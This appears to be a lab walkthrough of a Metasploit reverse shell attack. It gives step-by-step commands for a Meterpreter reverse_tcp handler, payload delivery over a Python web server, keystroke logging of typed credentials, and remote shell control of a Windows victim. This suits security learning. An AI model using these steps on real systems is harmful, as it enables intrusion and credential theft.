
## Demonstrating a Reverse Shell Attack

A reverse shell attack exploits vulnerabilities in a target system, allowing the attacker to gain remote access and control over the victim’s computer. It involves establishing a shell session by opening communication channels between the attacker’s machine and the target system.

**Note:** Throughout this project, it is essential to adhere to ethical standards and avoid engaging in any illegal or malicious activities. The primary purpose is to learn about potential vulnerabilities and attack vectors to enhance protection against them.

## Part One

## Setting Up the Attack Machine:

1. Open the Kali Linux attack virtual machine and note its IP address (e.g., 10.60.0.7).
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*4nYZBjdSfq77fqccN7Zu8Q.png)

2\. In the terminal, execute the “msfvenom” script to create a standalone payload as an executable file. Verify that the payload setup is successful.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*EAgsPIQvJE2OGCja68t6dw.png)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*wJfvJ8RFsEl9wsh0wH2OEA.png)

3\. Navigate to the home directory by typing “cd ~” in the terminal.

4\. Create a web file server on port 80 with the payload.exe directory by running the command “python -m http.server 80”.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*u2aNhASqc9PefXiwBrHdSQ.png)

## Part Two

## Configuring the Metasploit Framework:

1. Open a new terminal and start the Metasploit Framework console by typing “msfconsole”.
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*aiSfMZC5P21AOZ_a-LUWzg.png)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*tE1NAwJHEaKXHQs35NmKJg.png)

2\. Once the console is ready, use the command “use multi/handler” to handle exploits launched outside the framework.

3\. Configure the “exploit(multi/handler)” module with the same settings as the generated executable file by setting the payload, local host (LHOST), and local port (LPORT).

> *Type* ***set payload windows/meterpreter/reverse\_tcp*** *to set the payload.*
> 
> *Type set* ***LHOST 10.60.0.7*** *to set the local host to the Kali attack machine’s IP address.*
> 
> *Type* ***set LPORT 4444*** *to set the local port as the same port made in the executable file.*

4\. Confirm that everything is set up correctly by entering the command “exploit” to start the server on the meterpreter, waiting for the payload connection.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*c4OhK1vHz3gDr9elelrFYA.png)

## Part Three

## Preparing the Victim Machine:

1. Disable Real-time protection on the Windows victim machine.
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*_kelBH5FTj-Hd0iZdO-_0w.png)

2\. Open Microsoft Edge on the victim machine.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*MDuj_chgxkFVblMjROVVyA.png)

3\. In the browser tab, type the IP address of the Kali machine (e.g., 10.60.0.7).

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*dSJTsOfF6uKEvQvh-MXqOg.png)

4\. Access the HTTP web server directory and locate the payload.exe file.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*GYQiLfvnBLQYHSsAXGO-iA.png)

5\. Click on payload.exe and proceed through any download caution notifications, keeping the file and allowing it to run.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*-02hDePRP2jBRRG5BuicUg.png)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*k9Dd0sJLafjsyy8KHTErsg.png)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*S34FVmgkcO6lRHE1RTzk6g.png)

## Part Four

## Establishing a Meterpreter Session:

Once the payload is executed, a request is made to the Kali machine, which will acknowledge and create a Meterpreter session.

This Meterpreter session will have complete control over the Windows victim machine.

1. After executing the payload, the Kali machine receives a request and creates a Meterpreter session with the Windows victim machine.
2. Take note of the Meterpreter session number, which displays the IP address of the Windows victim machine (e.g., 10.60.0.8).
![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*-CKN9WtT1Ur8JrxjryZgvw.png)

Meterpreter session 1 opened. Windows victim machine has IP address 10.60.0.8.

3\. Explore the available commands by typing “help” in the Meterpreter session.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*PH-DRm7_vvc2DbFUCm1eEg.png)

4\. Start the keystroke sniffer by using the command “keyscan\_start”.

5\. Perform keystrokes on the Windows machine, such as typing in Microsoft Edge or entering login credentials.

> *Open* ***Microsoft Edge*** *on the Windows victim machine and type anything: I typed “My password is letmein123”.*
> 
> *Open a login page and type a* ***fake username and password****: I typed “usernameisjohn” and “password1234”.*

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*pRbGLbm7_QRXrePlBwARtA.png)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*7a015L6uGoNFkbAUxI26DA.png)

6\. Use the command “keyscan\_dump” to reveal the logged keystrokes.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*YAR5RwApGFnYSgDkpvmYaw.png)

7\. Stop the keystroke sniffer by entering “keyscan\_stop”.

For a Reverse Shell attack, type **Shell** on the meterpreter session.

A Channel 1 shell was created into the Windows machine.

## Part Five

## Performing Reverse Shell Attack:

1. Execute a reverse shell attack by typing “shell” in the Meterpreter session.
2. A Channel 1 shell will be created within the Windows machine, giving control to the attacker.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*xuhDVbhWV6RMG9HB3IPKpQ.png)

3\. Open Microsoft Edge by entering the command “start msedge.exe”.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*z9lUa4T_XsqiMaNEhsm8qQ.png)

4\. Utilize the shell to perform various actions, such as opening file explorer or running executable files.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*kgakfuNmwIO2I-EKa8gdDA.png)

5\. Exit from the shell by typing “exit”.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*NC_Wxjm2Gte1afTuHoWePg.png)

6\. Use the command “keyboard\_send google.com” to automatically type in “google.com”.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*gopGXOKzBdzB3LEyOyzMZg.png)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*t0KMPfsqgRZfCZANm8B_DQ.png)

7\. Specify an event (e.g., Enter) by typing “keyevent <event\_number>” and pressing Enter.

> *To specify which event you want, you have to type an event.*
> 
> *Type* ***keyevent 13*** *and click* ***Enter.***
> 
> *The number “13” indicates an enter which will select Enter on the Windows machine and open the webpage.*

8\. The specified event will be executed on the Windows machine, such as opening a webpage.

9\. Use the command “keyboard\_send” to send keyboard input.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*M8M8CjEEF_uhxIIAz0U1Lg.png)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*avod6ZLRj-DxclO1HP0_Pg.png)

10\. Re-enter the shell by typing “shell” and press Enter.

11\. Close Microsoft Edge by executing the command “TASKKILL /F /IM msedge.exe”.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*MlE-EP1rauV85C04ZGXpBw.png)

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*Qdt66VEeokcZPRgKzbhS-g.png)

## Conclusion

We just performed a reverse shell attack using Metasploit Framework to gain access to the Windows 10 target machine from the Kali Linux attacker.

With Windows Real-time protection turned off, the attacking machine could gain access to the target machine.

Preventative measures you can take to help prevent an attacker from infiltrating your system include but are not limited to not turning off your Windows Defender or virus protection, keeping up to date with patch management, conducting vulnerability scans that could reveal open ports in network infrastructure, and firewall configurations.